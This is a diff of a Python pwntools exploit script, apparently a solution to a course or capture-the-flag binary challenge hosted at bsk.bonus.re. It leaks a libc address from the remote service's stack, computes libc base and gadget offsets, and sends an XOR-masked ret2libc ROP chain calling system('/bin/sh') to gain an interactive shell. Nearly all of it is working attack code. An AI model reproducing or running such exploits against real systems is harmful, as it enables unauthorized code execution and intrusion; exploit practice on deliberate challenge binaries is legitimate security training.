@@ -1,89 +1,102 @@
 #!/usr/bin/env python3
 from pwn import *
 
-# exe = ELF("./easy")
-# exe = ELF("./medium")
-# hard chall is dynamically linked, so here's helper
-# patched version to load proper ld and libc
 exe = ELF("./hard_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-linux-x86-64.so.2")
 
 context.binary = exe
-index_number = b"438596"
+INDEX_NUMBER = b"438596"
+DIFFICULTY_LEVEL = {
+    "EASY": b"3",
+    "MEDIUM": b"2",
+    "HARD": b"1",
+}
+
+# Offsets
+# np. "gdb /lib/x86_64-linux-gnu/libc.so.6" i polecenie "p/x &system"
+SYSTEM_OFF = 0x55230
+# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
+BIN_SH_OFF = 0x1c041b
+# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'
+POP_RDI_OFF = 0x28715  # pop rdi ; ret
 
 
-def bxor(b1, b2):  # use xor for bytes
+def bytes_xor(b1, b2):
     result = b""
     for b1, b2 in zip(b1, b2):
         result += bytes([b1 ^ b2])
     return result
 
 
-def send_config(r):
-    r.sendline(index_number)
-    r.sendline(b"1")
+def send_index_and_difficulty(r):
+    r.sendline(INDEX_NUMBER)
+    r.sendline(DIFFICULTY_LEVEL["HARD"])
 
 
-def send_init(r):
+def send_data_buff(r):
     r.sendline(b"8")
     r.sendline(8 * b"A")
 
 
+def print_recv_stack(recv, mess_len):
+    for i in range(0, mess_len, 8):
+        print(hex(u64(recv[i:i + 8])))
+
+
 def conn():
-    # r = process([exe.path, index_number])
-    r = remote("bsk.bonus.re", 13337)
-    if args.GDB:
-        gdb.attach(r)
-    send_config(r)
+    # number of response messages like "how long is the data" etc.
+    response_msgs_len = 5
+    if args.LOCAL:
+        r = process([exe.path, INDEX_NUMBER])
+        if args.GDB:
+            gdb.attach(r)
+    else:
+        r = remote("bsk.bonus.re", 13337)
+        send_index_and_difficulty(r)
+        # additional welcome messages
+        response_msgs_len += 9
 
-    dl = 14 * 8
-    send_init(r)
-    r.sendline(str(dl).encode())
-    r.sendline(b"\0" * dl)
-    for _ in range(5 + 9):
+    # stage 1: get bytes for xor and leak libc
+    send_data_buff(r)
+    mess_len = 14 * 8
+    r.sendline(str(mess_len).encode())
+    r.sendline(b"\0" * mess_len)
+
+    # ignore all the messages but the "decrypted data" one
+    for _ in range(response_msgs_len):
         __ = r.recvline()
-    recv = r.recvn(dl)
+    recv = r.recvn(mess_len)
 
-    for _ in range(0, dl, 8):
-        print(hex(u64(recv[_:_ + 8])))
+    if args.VERBOSE:
+        print_recv_stack(recv, mess_len)
 
-    libc_off = u64(recv[(13 * 8):]) - 0x280D0
-    pop_rdi_off = 0x28715
-    ret_off = 0x28716
-    binsh_off = 0x1c041b
-    system_off = 0x55230
+    libc_base = u64(recv[(13 * 8):]) - 0x280D0
 
-    print("libc=" + hex(libc_off))
-    print("pop_rdi=" + hex(libc_off + pop_rdi_off))
-    print("ret=" + hex(libc_off + ret_off))
-    print("binsh=" + hex(libc_off + binsh_off))
-    print("system=" + hex(libc_off + system_off))
+    if args.VERBOSE:
+        print("libc=" + hex(libc_base))
+        print("ret=" + hex(libc_base + POP_RDI_OFF + 1))
+        print("pop_rdi=" + hex(libc_base + POP_RDI_OFF))
+        print("binsh=" + hex(libc_base + BIN_SH_OFF))
+        print("system=" + hex(libc_base + SYSTEM_OFF))
 
-    send_init(r)
-    dl = 104
-    r.sendline(str(dl).encode())
-    payload = 72 * b"\0" + bxor(
-        p64(libc_off + ret_off) +
-        p64(libc_off + pop_rdi_off) +
-        p64(libc_off + binsh_off) +
-        p64(libc_off + system_off),
-        recv[72: dl])
+    # stage 2: send rop chain
+    send_data_buff(r)
+    mess_len = 104
+    r.sendline(str(mess_len).encode())
+    payload = 72 * b"\0" + bytes_xor(
+        p64(libc_base + POP_RDI_OFF + 1) +
+        p64(libc_base + POP_RDI_OFF) +
+        p64(libc_base + BIN_SH_OFF) +
+        p64(libc_base + SYSTEM_OFF),
+        recv[72: mess_len])
     r.sendline(payload)
-
-    # for _ in range(5):
-    #     __ = r.recvline()
-    # recv = r.recvline()  # bytes for xor
-    #
-    # for _ in range(0, dl, 8):
-    #     print(hex(u64(recv[_:_+8])))
 
     return r
 
 
 def main():
     r = conn()
-    # good luck!
     r.interactive()
 
 
